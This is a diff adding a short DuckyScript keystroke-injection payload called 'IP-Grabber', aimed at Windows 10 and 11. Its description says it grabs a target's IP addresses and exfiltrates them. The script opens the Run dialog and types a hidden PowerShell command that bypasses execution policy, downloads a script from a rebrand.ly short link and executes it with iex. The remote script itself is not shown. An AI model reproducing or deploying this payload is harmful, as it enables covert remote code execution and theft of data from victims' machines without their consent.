@@ -1,0 +1,12 @@
+REM     Title: IP-Grabber
+
+REM     Author: 4E656f
+
+REM     Description: This payload is meant to do grab your targets IP addresses and exfil them
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm rebrand.ly/4e656f-ipgrabber | iex
+ENTER
